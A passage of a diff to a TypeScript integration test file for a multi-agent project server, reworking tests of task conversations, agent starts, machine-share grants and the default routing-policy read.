     await store.stopped(host, one.tab, assignmentId, 'native-stop-receipt')
     expect(await assignmentRows(store, host, 'test-host')).not.toContainEqual({ tabId: one.tab, assignmentId, harnessId: session })
     expect(await db.superTabDelivery.count({ where: { tabId: one.tab, assignmentId, status: 'queued' } })).toBe(0)
-    await run(two.tab, { type: 'work.assign', conversationId: 'lead', agentId: worker })
-    await run(one.tab, define)
-    expect((await db.superTabAttempt.findUnique({ where: { id: assignmentId } }))!.snapshot).toMatchObject({ assignment: { status: 'stopped', configuration: config } })
-  })
-
-  it('lists the attempts of one group, newest first, after a stop and a new definition', async () => {
-    const { tab, lead } = await fixture()
-    const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Builder', configuration: config, lead: false })).result.agentId as string
-    const define = (brief: string): Command => ({ type: 'work.define', conversationId: 'lead', brief, checks: [{ description: 'Test passes.', independent: false }] })
-    const attempt = async (brief: string) => {
-      await run(tab, define(brief))
-      const id = (await run(tab, { type: 'work.assign', conversationId: 'lead', agentId: worker })).result.assignmentId as string
-      await store.stopped(host, tab, id, 'native-stop-receipt')
-      return id
-    }
-    const first = await attempt('Build it.')
-    const second = await attempt('Build it again.')
-    await run(tab, define('Build it a third time.'))
-    // A host-confirmed stop sets its own result, so a long one is seeded: the server cuts it.
-    const long = randomUUID()
-    await db.superTabAttempt.create({ data: { id: long, tabId: tab, conversationId: 'lead', createdAt: new Date(0), snapshot: { assignment: {
-      id: long, agentId: worker, status: 'done', result: 'x'.repeat(900), execution: { machineId: 'test-host', harnessId: 'secret-harness', machineOwnerId: host.sub } } } } })
-    const url = `/api/super-tabs/${tab}/conversations/lead/attempts`
-    const read = (user: AuthUser, query = '') => app.inject({ url: `${url}${query}`, headers: { authorization: `Bearer ${user.sub}` } })
-    const listed = (await read(owner)).json().data
-    expect(listed.map((a: { id: string }) => a.id)).toEqual([second, first, long])
-    expect(listed[1]).toMatchObject({ id: first, agentId: worker, status: 'stopped', createdAt: expect.any(String) })
-    expect(listed[2]).toMatchObject({ id: long, status: 'done', result: 'x'.repeat(500) })
-    // Only what a reader of the group needs: no host grant, configuration or brief.
-    expect(Object.keys(listed[2]).sort()).toEqual(['agentId', 'createdAt', 'id', 'result', 'status'])
-    expect((await read(host, `?asAgentId=${lead}`)).json().data).toHaveLength(3)
-    await invite(tab, 'viewer')
-    expect((await read(peer)).statusCode).toBe(200)
-    expect((await app.inject({ url, headers: { authorization: `Bearer ${randomUUID()}` } })).statusCode).toBe(401)
-  })
-
-  it('refuses the attempts of a group to a non-member and never crosses tabs', async () => {
-    const one = await fixture()
-    const two = await fixture()
-    const group = (await run(two.tab, { type: 'conversation.create', title: 'Other work', brief: '', checks: [] })).result.conversationId as string
-    const read = (tab: string, conversation: string, user: AuthUser, query = '') =>
-      app.inject({ url: `/api/super-tabs/${tab}/conversations/${conversation}/attempts${query}`, headers: { authorization: `Bearer ${user.sub}` } })
-    // A non-member is answered as for a Swarm that does not exist (routes/superTabs.ts NOT_AVAILABLE).
-    expect((await read(one.tab, 'lead', peer)).statusCode).toBe(404)
-    expect((await read(one.tab, group, owner)).statusCode).toBe(404)
-    expect((await read(two.tab, group, owner)).statusCode).toBe(200)
-    expect((await read(one.tab, 'lead', host, `?asAgentId=${two.lead}`)).statusCode).not.toBe(200)
   })
 
   it('tells the lead once when the host confirms its worker stopped', async () => {
     const { tab, lead } = await fixture()
-    const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
+    // A worker of a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Builder', configuration: config, lead: false })).result.agentId as string
     const displayName = (await store.read(owner, tab)).state.agents.find(a => a.id === worker)!.displayName!
-    await run(tab, { type: 'work.define', conversationId: 'lead', brief: 'Build it.', checks: [{ description: 'Test passes.', independent: false }] })
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: 'lead', agentId: worker })).result.assignmentId as string
+    const assignmentId = (await storeAssignment(db, tab, group, worker)).id
     const before = (await store.deliveries(host, tab, lead)).length
     await store.stopped(host, tab, assignmentId, 'native-stop-receipt')
     await store.stopped(host, tab, assignmentId, 'native-stop-receipt')
-    const notices = (await store.messages(owner, tab, 'lead', {})).messages.filter(m => m.text.startsWith('Stopped'))
+    const notices = (await store.messages(owner, tab, group, {})).messages.filter(m => m.text.startsWith('Stopped'))
     expect(notices).toHaveLength(1)
     expect(notices[0]).toMatchObject({ author: { kind: 'agent', id: worker, name: 'Builder', displayName },
       text: 'Stopped\n\nThe execution host confirmed that this harness stopped.' })
     expect(await store.deliveries(host, tab, lead)).toHaveLength(before + 1)
-    expect((await store.read(owner, tab)).state.conversations[0]!.lastMessageSequence).toBe(notices[0]!.sequence)
+    expect((await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.lastMessageSequence).toBe(notices[0]!.sequence)
     await run(tab, { type: 'agent.remove', agentId: worker })
-    expect((await store.messages(owner, tab, 'lead', {})).messages.find(m => m.id === notices[0]!.id)!.author)
+    expect((await store.messages(owner, tab, group, {})).messages.find(m => m.id === notices[0]!.id)!.author)
       .toMatchObject({ displayName })
   })
 
@@ -2010,18 +1546,63 @@ describe('Super Tabs on a real Mongo replica set', () => {
     await db.machine.create({ data: { machineId: 'private-host', userId: peer.sub, apiKey: 'private-fixture', managerId: 'fixture', autonomousEnv: 'prod' } })
     await expect(run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'private-host', harnessId: 'private', name: 'Private', configuration: config, lead: false })).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
     const post = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/commands`, headers,
-      payload: { operationId: randomUUID(), command: message('A shared conversation.') } })
+      payload: { operationId: randomUUID(), command: await toPm(tab, 'A shared conversation.') } })
     expect(post.statusCode).toBe(200)
-    const history = await app.inject({ url: `/api/super-tabs/${tab}/conversations/lead/messages`, headers })
-    expect(history.json().data.messages[0].text).toBe('A shared conversation.')
+    const history = await app.inject({ url: `/api/super-tabs/${tab}/conversations/${await pmChat(tab)}/messages`, headers })
+    expect(history.json().data.messages.map((m: { text: string }) => m.text)).toEqual(['A shared conversation.'])
+  })
+
+  // Task #3078: a join failed about one run in 32 (CI runs 41962752144 and 41966667786). The Lead's member name is drawn from 32
+  // by its id, and a harness added under a name another member holds joins under a different one.
+  it('joins a harness under another member name when the Lead already holds the one it asked for', async () => {
+    const { tab, lead } = await fixture(leadHarness('Kai'))
+    const headers = { authorization: `Bearer ${owner.sub}` }
+    expect((await storedState(tab)).agents.find(a => a.id === lead)?.displayName).toBe('Kai')
+    const joined = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/commands`, headers,
+      payload: { operationId: randomUUID(), command: { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: 'new-pm-personal',
+        name: 'Kai', configuration: config, lead: false } } })
+    expect(joined.statusCode, joined.body).toBe(200)
+    const agents = (await storedState(tab)).agents
+    const added = agents.find(a => a.id === joined.json().data.result.agentId)!
+    expect(added.displayName).not.toBe('Kai')
+    expect(agents.find(a => a.id === lead)?.displayName).toBe('Kai')
+    // The row names the harness as it is shown, not the name it asked for.
+    const rows = (await app.inject({ url: `/api/super-tabs/${tab}/conversations/lead/messages`, headers })).json().data.messages as Array<{ text: string }>
+    expect(rows.some(m => m.text.startsWith(`owner added "${added.displayName}" to the project.`))).toBe(true)
+    expect(rows.some(m => m.text.includes('added "Kai" to the project.'))).toBe(false)
+  })
+
+  it('joins a Product Manager with a first message and a launch-refused note, through the HTTP API', async () => {
+    const tab = (await store.create(owner, randomUUID(), 'Personal')).id
+    const headers = { authorization: `Bearer ${owner.sub}` }
+    const operationId = randomUUID()
+    const joined = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/commands`, headers,
+      payload: { operationId, command: { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: 'new-pm',
+        name: 'Lead', configuration: config, lead: true, initialMessage: 'Hi New PM Personal',
+        launchRefused: { model: 'opus', effort: 'xhigh' } } } })
+    expect(joined.statusCode, joined.body).toBe(200)
+    const read = async (id: string) => (await app.inject({ url: `/api/super-tabs/${tab}/conversations/${id}/messages`, headers })).json().data.messages as
+      Array<{ id: string; text: string }>
+    // Swarm v4: the first request is its person's first line in their own chat with the PM; the channel says the model was refused.
+    const agentId = joined.json().data.result.agentId as string
+    const chat = (await storedState(tab)).conversations.find(c => c.kind === 'agent-chat' && c.agentIds.includes(agentId))!
+    const first = (await read(chat.id)).find(m => m.text === 'Hi New PM Personal')
+    expect(first?.id).toBe(joined.json().data.result.messageId)
+    const channel = await read('lead')
+    expect(channel.some(m => m.text === 'Hi New PM Personal')).toBe(false)
+    expect(channel.find(m => m.text.includes('could not launch it with them'))?.id).toBeDefined()
+    expect((await storedState(tab)).conversations.find(c => c.id === 'lead')?.leadId).toBe(joined.json().data.result.agentId)
   })
 
   it('rechecks the machine share at delivery even while the contributor remains in the tab', async () => {
-    const { tab } = await fixture()
+    const { tab, lead } = await fixture()
     await invite(tab)
-    const agentId = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
+    // A worker of a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const agentId = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Peer worker', configuration: config, lead: false }, peer)).result.agentId as string
-    await run(tab, { ...message('Only on an authorized machine.'), recipientIds: [agentId] } as Command)
+    // The PM's: only agents post in a task's chat (agentsOnly.test.ts).
+    await run(tab, { ...message('Only on an authorized machine.'), conversationId: group, recipientIds: [agentId] } as Command, host, lead)
     expect(await store.deliveries(host, tab, agentId)).toHaveLength(1)
     try {
       const before = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
@@ -2042,9 +1623,11 @@ describe('Super Tabs on a real Mongo replica set', () => {
   it('also withholds outgoing instructions from an agent whose machine grant was revoked', async () => {
     const { tab, lead } = await fixture()
     await invite(tab)
-    const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
+    // A worker of a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Peer worker', configuration: config, lead: false }, peer)).result.agentId as string
-    await store.execute(host, tab, { operationId: randomUUID(), command: { ...message('Delegated before revocation.'), recipientIds: [worker] } as Command }, lead)
+    await store.execute(host, tab, { operationId: randomUUID(), command: { ...message('Delegated before revocation.'), conversationId: group, recipientIds: [worker] } as Command }, lead)
     const [delivery] = await store.deliveries(host, tab, worker)
     expect(delivery).toBeTruthy()
     const before = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
@@ -2082,14 +1665,14 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const group = (await run(tab, { type: 'conversation.create', title: 'Release', brief: 'Ship it.', checks: [{ description: 'Shipped.', independent: false }] })).result.conversationId as string
     const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Builder', configuration: config, lead: false })).result.agentId as string
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId as string
+    const assignmentId = (await storeAssignment(db, tab, group, worker)).id
     const row = async () => (await rosterRows(store, host, 'test-host')).find(t => t.tabId === tab && t.agent.id === worker)!
     expect(await row()).toMatchObject({ tabName: 'Pilot', attention: null })
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'blocked', result: 'No access to staging.' } as Command, host, worker)
+    await storeStatus(db, tab, group, 'blocked', 'No access to staging.')
     expect((await row()).attention).toEqual({ assignmentId, status: 'blocked', result: 'No access to staging.' })
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'needs_human', result: null } as Command, host, worker)
+    await storeStatus(db, tab, group, 'needs_human')
     expect((await row()).attention).toEqual({ assignmentId, status: 'needs_human', result: null })
-    await run(tab, { type: 'work.status', conversationId: group, assignmentId, status: 'working', result: null } as Command, host, worker)
+    await storeStatus(db, tab, group, 'working')
     expect((await row()).attention).toBeNull()
   })
 
@@ -2105,9 +1688,11 @@ describe('Super Tabs on a real Mongo replica set', () => {
     expect(await active()).toEqual({ [lead]: true, [worker]: false })
   })
 
-  it('serializes native start claims and fences a restored target-machine grant', async () => {
+  it('serializes native start claims, and starts nothing through another person\'s machine share (task #4120)', async () => {
     const { tab } = await fixture()
-    const request = { conversationId: 'lead', machineId: 'test-host', engine: 'claude', name: 'Builder', cwd: '/fixture/repo', worktree: true,
+    // In a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: group, machineId: OWN_MAC, engine: 'claude', name: 'Builder', cwd: '/fixture/repo', worktree: true,
       requirements: { memoryBytes: 100, diskBytes: 200, maxCpuPercent: 80, tools: ['git'], devices: [], quotaRequired: false } }
     const intent = randomUUID()
     const starts = await Promise.all(Array.from({ length: 3 }, () => run(tab, { type: 'agent.start', request }, owner, undefined, intent)))
@@ -2117,18 +1702,9 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const claims = await Promise.allSettled(Array.from({ length: 2 }, () => run(tab, { type: 'agent.startDispatch', startId })))
     expect(claims.filter(c => c.status === 'fulfilled')).toHaveLength(1)
     expect((await store.start(owner, tab, startId)).dispatched).toBe(true)
-    const original = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
-    try {
-      await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: [peer.email],
-        grantVersions: nextMachineShareGrants(original, [peer.email], null) } })
-      await expect(store.start(owner, tab, startId)).rejects.toMatchObject({ code: 'HOST_REQUIRED' })
-    } finally {
-      const current = await db.machineShare.findUniqueOrThrow({ where: { machineId: 'test-host' } })
-      await db.machineShare.update({ where: { machineId: 'test-host' }, data: { emails: [owner.email, peer.email],
-        grantVersions: nextMachineShareGrants(current, [owner.email, peer.email], null) } })
-    }
-    await expect(store.start(owner, tab, startId)).rejects.toMatchObject({ code: 'CONTRIBUTION_REVOKED' })
-    await expect(run(tab, { type: 'agent.started', startId, harnessId: 'must-not-join', configuration: config })).rejects.toMatchObject({ code: 'CONTRIBUTION_REVOKED' })
+    // A start on the host's machine, shared with the owner, would run in the host's account: refused before anything is queued.
+    await expect(run(tab, { type: 'agent.start', request: { ...request, machineId: 'test-host' } })).rejects.toMatchObject({ code: 'NOT_YOUR_COMPUTER' })
+    expect((await store.read(owner, tab)).state.starts).toHaveLength(1)
   })
 
   // Any agent of the project starts agents (project instructions, phase 4); a stuck start is its maker's or its coordinator's.
@@ -2137,10 +1713,9 @@ describe('Super Tabs on a real Mongo replica set', () => {
     const add = async (name: string) => String((await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
       name, configuration: config, lead: false })).result.agentId)
     const engineer = await add('Engineer'), other = await add('Agent')
-    // In a task: the project chat's routes and starts are its coordinator's or a person's (security review L2).
+    // In a task: the project chat's starts are its coordinator's or a person's (security review L2).
     const task = String((await run(tab, { type: 'conversation.create', title: 'Build it', brief: 'Build it.', checks: [] })).result.conversationId)
-    // A model the build floor takes, so only who resumes it is under test.
-    const { startId } = await routedStart(tab, engineer, undefined, 'gpt-6.1-sol', task)
+    const { startId } = await startBuilder(tab, engineer, 'gpt-6.1-sol', task)
     expect((await store.start(host, tab, startId, engineer)).id).toBe(startId)
     expect((await store.start(host, tab, startId, lead)).id).toBe(startId)
     await expect(store.start(host, tab, startId, other)).rejects.toMatchObject({ code: 'FORBIDDEN' })
@@ -2151,7 +1726,7 @@ describe('Super Tabs on a real Mongo replica set', () => {
 
   it('does not authorize a host through a contributor’s obsolete email address', async () => {
     const { tab, lead } = await fixture()
-    await run(tab, message('Requires the current machine grant.'))
+    await run(tab, await toPm(tab, 'Requires the current machine grant.'))
     try {
       await db.user.update({ where: { id: owner.sub }, data: { email: 'changed@example.net' } })
       await expect(store.deliveries(host, tab, lead)).rejects.toMatchObject({ code: 'CONTRIBUTION_REVOKED' })
@@ -2160,217 +1735,50 @@ describe('Super Tabs on a real Mongo replica set', () => {
     }
   })
 
-  // Project instructions, phase 4: nothing steps a task up; a grid attempt's failed first review is a notice (commands.test.ts).
-  it('steps nothing up on a failed verdict, on a task that stepped up before', async () => {
-    const { tab } = await fixture()
-    const group = (await run(tab, { type: 'conversation.create', title: 'Docs', brief: 'Fix the docs.', checks: [{ description: 'Reviewed', independent: true }] })).result.conversationId as string
-    const sonnet = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(), name: 'Sonnet',
-      configuration: { ...config, engine: 'claude', model: 'claude-sonnet-4-5' }, lead: false })).result.agentId as string
-    const assignmentId = (await run(tab, { type: 'work.assign', conversationId: group, agentId: sonnet })).result.assignmentId as string
-    // The task stepped up to Sonnet before, on an older server.
-    const part = await db.swarmGroup.findFirstOrThrow({ where: { tabId: tab, key: group } })
-    await db.swarmGroup.update({ where: { id: part.id }, data: { version: part.version + 1,
-      data: { ...part.data as object, stepUp: { attempt: 2, floor: 2, reason: 'Its first review said Ready no.', at: 1, carry: '' } } } })
-    const checkId = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!.checks[0]!.id
-    await run(tab, { type: 'work.check', conversationId: group, assignmentId, checkId, passed: false, evidence: 'Ready: no.' })
-    const after = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!
-    expect(after.assignment).toMatchObject({ id: assignmentId, status: 'working' })
-    expect(after.stepUp).toMatchObject({ attempt: 2 })
-  })
-
-  // Routing lives in each project's instructions (project instructions, phase 4): an older Desktop's account policy and tab
-  // override are answered and kept nowhere.
-  it('keeps neither an account policy nor a tab override an older Desktop saves, and serves the default', async () => {
-    const saved = await store.saveAccountPolicy(owner, 0, { ...DEFAULT_ROUTING_POLICY, quotaReserve: 30 })
-    expect(saved).toMatchObject({ policy: DEFAULT_ROUTING_POLICY, revision: 0, isDefault: true, ignored: true })
-    // Saved twice on the same revision: both are answered, neither kept.
-    await store.saveAccountPolicy(owner, 0, DEFAULT_ROUTING_POLICY)
-    expect(await db.routingPolicy.count({ where: { userId: owner.sub } })).toBe(0)
-    expect(await store.accountPolicy(owner)).toEqual({ policy: DEFAULT_ROUTING_POLICY, revision: 0, isDefault: true })
+  it('serves the default policy to every member and its agents', async () => {
     const { tab, lead } = await fixture()
-    expect((await run(tab, { type: 'tab.routingPolicy', policy: { notes: 'Prefer remote-1.' } })).result).toMatchObject({ ignored: true })
-    expect((await storedState(tab)).routingPolicy).toBeUndefined()
     await invite(tab, 'viewer')
     for (const [user, asAgent] of [[owner, undefined], [peer, undefined], [host, lead]] as const) {
       expect((await store.tabPolicy(user, tab, asAgent)).policy).toEqual(DEFAULT_ROUTING_POLICY)
     }
     const response = await app.inject({ url: `/api/super-tabs/${tab}/routing-policy`, headers: { authorization: `Bearer ${peer.sub}` } })
     expect(response.statusCode).toBe(200)
-    expect((await app.inject({ url: '/api/super-tabs/routing-policy', headers: { authorization: `Bearer ${owner.sub}` } })).statusCode).toBe(200)
   })
 
   // The model catalog (project instructions, phase 4, decision 14): served in the tab's routing-policy read beside the default
-  // policy, which older CLIs read as before. A policy row or tab override saved before stays in place, unread.
-  it('serves the catalog, priors and prices with the default policy, whatever the owner saved', async () => {
+  // policy.
+  it('serves the catalog, priors and prices with the default policy', async () => {
     const { tab, lead } = await fixture()
-    const id = stableId('routing-policy', owner.sub, owner.autonomousEnv)
-    await db.routingPolicy.create({ data: { id, userId: owner.sub, autonomousEnv: owner.autonomousEnv, revision: 4,
-      policy: { ...DEFAULT_ROUTING_POLICY, quotaReserve: 40, notes: 'Saved before instructions.' } } })
-    onTestFinished(async () => { await db.routingPolicy.deleteMany({ where: { id } }) })
-    const state = await storedState(tab)
-    await saveState(tab, { ...state, routingPolicy: { notes: 'Prefer remote-1.' } })
-    expect((await storedState(tab)).routingPolicy).toEqual({ notes: 'Prefer remote-1.' })
 
     const read = await app.inject({ url: `/api/super-tabs/${tab}/routing-policy`, headers: { authorization: `Bearer ${owner.sub}` } })
     expect(read.statusCode, read.body).toBe(200)
     const data = read.json().data
-    // An older Desktop shows the read's warnings atop its routing dialog, and reads no save's `note`: they say where routing went.
-    expect(data).toMatchObject({ policy: DEFAULT_ROUTING_POLICY, warnings: [IGNORED_NOTE], overridden: [], override: null, account: DEFAULT_ROUTING_POLICY })
-    expect(data.catalog.models).toHaveLength(7)
+    expect(data).toMatchObject({ policy: DEFAULT_ROUTING_POLICY, warnings: [], overridden: [], override: null, account: DEFAULT_ROUTING_POLICY })
+    // Six rows since task #2972: Codex has Sol and Astra by name, and no `default default` row.
+    expect(data.catalog.models).toHaveLength(6)
+    expect(data.catalog.models.filter((m: { model: string; effort: string }) => m.model === 'default' || m.effort === 'default')).toEqual([])
     expect(data.catalog.grid).toEqual({ strength: 1, models: [{ model: 'kimi k3', strength: 2 }, { model: 'deepseek v4.1', strength: 2 }] })
     expect(data.catalog.prices.map((p: { model: string }) => p.model)).toContain('claude-opus-5-5')
     expect(data.catalog.priors.models.length).toBeGreaterThan(0)
-    // An agent's read has none: the CLI's route prints the read's warnings with every route.
     expect(await store.tabPolicy(host, tab, lead)).toMatchObject({ policy: DEFAULT_ROUTING_POLICY, warnings: [] })
-    const account = await app.inject({ url: '/api/super-tabs/routing-policy', headers: { authorization: `Bearer ${owner.sub}` } })
-    expect(account.json().data).toEqual({ policy: DEFAULT_ROUTING_POLICY, revision: 0, isDefault: true })
-    expect(await db.routingPolicy.count({ where: { id } })).toBe(1)
-
-    // A Buddy reads no routing.
-    const helper = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Helper', configuration: config, lead: false })).result.agentId as string
-    const row = await db.swarmAgent.findFirstOrThrow({ where: { tabId: tab, key: helper } })
-    const people = (await store.read(owner, tab)).state.people
-    await db.swarmAgent.update({ where: { id: row.id }, data: { data: { ...row.data as object,
-      buddyOf: { personId: owner.sub, generation: people.find(p => p.id === owner.sub)!.generation } } } })
-    await expect(store.tabPolicy(host, tab, helper)).rejects.toMatchObject({ code: 'BUDDY_FORBIDDEN' })
-  })
-
-  it('records, supersedes and lets a person change a route decision; a closed one refuses', async () => {
-    const { tab, lead } = await fixture()
-    const decision = { assessment: { difficulty: 'medium', risk: 'low', why: 'A small API change.' },
-      candidates: [
-        { id: 'c0', kind: 'member', agentId: lead, machineId: 'test-host', engine: 'claude', model: 'sonnet', effort: 'medium', quality: 2, cost: 2, title: 'Lead · Claude sonnet medium · test-host', label: 'Member Lead' },
-        { id: 'c1', kind: 'new', machineId: 'test-host', engine: 'claude', model: 'opus', effort: 'high', quality: 3, cost: 3, title: 'New agent · Claude opus high · test-host', label: 'New agent' },
-      ], excluded: [{ title: 'New agent · Codex · test-host', reason: 'The selected agent engine is not installed on this machine.' }],
-      floor: 2, notes: false, pick: 'c0', via: 'order', fallback: 'unsure', p: null, belowFloor: false, why: 'Jev unsure; first in the policy order.' }
-    const first = (await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)).result.routeDecisionId as string
-    const second = (await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)).result.routeDecisionId as string
-    expect((await store.routeDecision(owner, tab, first)).outcome).toBe('superseded')
-    const rows = await db.superTabMessage.findMany({ where: { tabId: tab, conversationId: 'lead' }, orderBy: { sequence: 'asc' } })
-    expect(rows.at(-1)).toMatchObject({ text: expect.stringContaining('"A small API change."'),
-      source: { kind: 'route', decisionId: second, via: 'order', fallback: 'unsure', why: 'A small API change.' } })
-    // The Lead's ruling, 2026-10-29: routing in the project chat is agent bookkeeping, read by no one there (commands.ts).
-    expect((await store.messages(owner, tab, 'lead', {})).messages.map(m => m.id)).not.toContain(rows.at(-1)!.id)
-    await expect(run(tab, { type: 'route.override', decisionId: first, candidateId: 'c1', reason: 'Needs Opus.' } as Command))
-      .rejects.toMatchObject({ code: 'ROUTE_CLOSED' })
-    await run(tab, { type: 'route.override', decisionId: second, candidateId: 'c1', reason: 'Needs Opus.' } as Command)
-    expect((await store.routeDecision(owner, tab, second)).override).toMatchObject({ by: 'person', candidateId: 'c1' })
-    expect((await store.deliveries(host, tab, lead)).length).toBeGreaterThan(0)
-    await invite(tab, 'viewer')
-    await expect(run(tab, { type: 'route.override', decisionId: second, candidateId: 'c0', reason: 'No.' } as Command, peer))
-      .rejects.toMatchObject({ status: 403 })
-    expect((await store.routeDecisions(owner, tab)).map(d => d.id)).toEqual([second, first])
-    const response = await app.inject({ url: `/api/super-tabs/${tab}/route-decisions/${second}`, headers: { authorization: `Bearer ${peer.sub}` } })
-    expect(response.statusCode).toBe(200)
   })
 
   it('returns the receipt of a recorded agent start after its machine stops being listed', async () => {
     const { tab, lead } = await fixture()
     const machineId = `second-${randomUUID()}`
-    await db.machine.create({ data: { machineId, userId: host.sub, apiKey: 'fixture-only', managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
-    await db.machineShare.create({ data: { machineId, ownerId: host.sub, autonomousEnv: 'prod', emails: [owner.email] } })
+    // The owner's own second computer, shared with nobody: a new agent starts only on its own person's computer (task #4120).
+    await db.machine.create({ data: { machineId, userId: owner.sub, apiKey: `fixture-${machineId}`, managerId: 'fixture', autonomousEnv: 'prod', authMode: 'remote' } })
     const helper = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId, harnessId: randomUUID(), name: 'Helper', configuration: config, lead: false })).result.agentId as string
-    const request = { conversationId: 'lead', machineId, engine: 'codex', name: 'Builder', cwd: '/work', worktree: true,
+    // Started in a task: the project chat holds only its coordinator among agents (#2207).
+    const group = String((await run(tab, { type: 'conversation.create', title: 'Task', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: group, machineId, engine: 'codex', name: 'Builder', cwd: '/work', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-    const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Docs.' },
-      candidates: [{ id: 'c0', kind: 'new', machineId: 'test-host', engine: 'claude', model: 'haiku', effort: 'auto', quality: 1, cost: 1, title: 'New agent', label: 'New agent' }],
-      excluded: [], floor: 1, notes: false, pick: 'c0', via: 'only', p: null, belowFloor: false, why: 'Only candidate.' }
-    const routeDecisionId = (await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)).result.routeDecisionId as string
-    const operationId = randomUUID(), command: Command = { type: 'agent.start', request, routeDecisionId, overrideReason: 'The helper machine has the repository.' }
+    const operationId = randomUUID(), command: Command = { type: 'agent.start', request }
     const first = await run(tab, command, host, lead, operationId)
     await run(tab, { type: 'agent.remove', agentId: helper })
     // A new start on the machine is refused now, but the recorded one keeps its receipt.
     await expect(run(tab, command, host, lead)).rejects.toMatchObject({ code: 'MACHINE_NOT_LISTED' })
     expect((await run(tab, command, host, lead, operationId)).result.startId).toBe(first.result.startId)
-  })
-
-  it('corrects the log to the model that ran when the routed switch failed, and reads the times of one decision', async () => {
-    const { tab, lead } = await fixture()
-    const decision = { assessment: { difficulty: 'low', risk: 'low', why: 'Docs.' },
-      candidates: [{ id: 'c0', kind: 'new', machineId: 'test-host', engine: 'claude', model: 'haiku', effort: 'auto', quality: 1, cost: 1, title: 'New agent', label: 'New agent' }],
-      excluded: [], floor: 1, notes: false, pick: 'c0', via: 'only', p: null, belowFloor: false, why: 'Only candidate.' }
-    const routeDecisionId = (await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)).result.routeDecisionId as string
-    const request = { conversationId: 'lead', machineId: 'test-host', engine: 'claude', model: 'haiku', effort: 'auto', name: 'Builder', cwd: '/fixture/repo', worktree: false,
-      requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
-    const startId = (await run(tab, { type: 'agent.start', request, routeDecisionId } as Command, host, lead)).result.startId as string
-    // A queued start already holds its account's quota when the Lead routes again.
-    await run(tab, { type: 'route.record', conversationId: 'lead', decision } as Command, host, lead)
-    expect((await store.routeDecision(owner, tab, routeDecisionId)).outcome).toBeNull()
-    await expect(run(tab, { type: 'route.modelResult', decisionId: routeDecisionId, startId: 'other', model: 'sonnet', effort: 'auto' } as Command, host, lead))
-      .rejects.toMatchObject({ code: 'ROUTE_MISMATCH' })
-    const before = (await store.messages(owner, tab, 'lead', {})).messages.length
-    await run(tab, { type: 'route.modelResult', decisionId: routeDecisionId, startId, model: 'sonnet', effort: 'auto' } as Command, host, lead)
-    expect((await store.messages(owner, tab, 'lead', {})).messages).toHaveLength(before)
-    const read = async () => (await app.inject({ url: `/api/super-tabs/${tab}/route-decisions/${routeDecisionId}`, headers: { authorization: `Bearer ${owner.sub}` } })).json().data
-    expect(await read()).toMatchObject({ outcome: null, outcomeAt: null, createdAt: expect.any(String),
-      final: { kind: 'new', startId, model: 'sonnet', effort: 'auto', requested: { model: 'haiku', effort: 'auto' } } })
-  })
-
-  it('releases a queued start\'s route hold when that start fails', async () => {
-    const { tab, lead } = await fixture()
-    const { routeDecisionId, startId } = await routedStart(tab, lead)
